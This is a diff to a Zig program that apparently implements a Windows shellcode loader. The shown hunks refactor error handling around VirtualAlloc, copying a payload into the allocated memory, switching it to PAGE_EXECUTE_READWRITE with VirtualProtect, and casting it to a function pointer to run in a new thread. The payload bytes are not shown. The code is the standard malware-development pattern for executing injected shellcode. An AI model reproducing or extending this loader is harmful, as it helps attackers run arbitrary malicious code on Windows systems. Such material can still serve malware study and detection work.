@@ -198,15 +198,15 @@ pub fn main() !void {
 
     std.debug.print("[i] Allocating Memory With VirtualAlloc\n", .{});
 
-    const shellcode = VirtualAlloc(null, payload.len, .{ .COMMIT = 1, .RESERVE = 1 }, .{ .PAGE_READWRITE = 1 });
-    if (shellcode == null) {
+    const shellcode = VirtualAlloc(null, payload.len, .{ .COMMIT = 1, .RESERVE = 1 }, .{ .PAGE_READWRITE = 1 }) orelse {
         std.debug.print("[!] VirtualAlloc Failed With Error: {s}\n", .{@tagName(win.kernel32.GetLastError())});
         return error.VirtualAllocFailed;
-    }
-    defer _ = VirtualFree(shellcode.?, 0, .RELEASE);
-    std.debug.print("[i] Allocated Memory At: {*}\n", .{shellcode.?});
+    };
 
-    @memcpy(@as([*]u8, @ptrCast(shellcode.?)), payload);
+    defer _ = VirtualFree(shellcode, 0, .RELEASE);
+    std.debug.print("[i] Allocated Memory At: {*}\n", .{shellcode});
+
+    @memcpy(@as([*]u8, @ptrCast(shellcode)), payload);
     @memset(payload, 0);
 
     std.debug.print("[i] Modifying Memory Protection To EXECUTE_READWRITE ...\n", .{});
@@ -214,16 +214,16 @@ pub fn main() !void {
     var old_protection: PAGE_PROTECTION_FLAGS = undefined;
 
     if (VirtualProtect(
-        shellcode.?,
+        shellcode,
         payload.len,
         .{ .PAGE_EXECUTE_READWRITE = 1 },
         &old_protection,
-    ) != 1) {
+    ) == 0) {
         std.debug.print("[!] VirtualProtect Failed With Error: {s}\n", .{@tagName(win.kernel32.GetLastError())});
         return error.VirtualProtectFailed;
     }
 
-    const shellcode_fn: *const fn (lpThreadParameter: ?*anyopaque) callconv(WINAPI) u32 = @ptrCast(shellcode.?);
+    const shellcode_fn: *const fn (lpThreadParameter: ?*anyopaque) callconv(WINAPI) u32 = @ptrCast(shellcode);
 
     std.debug.print("[i] Creating A New Thread ...\n", .{});
 
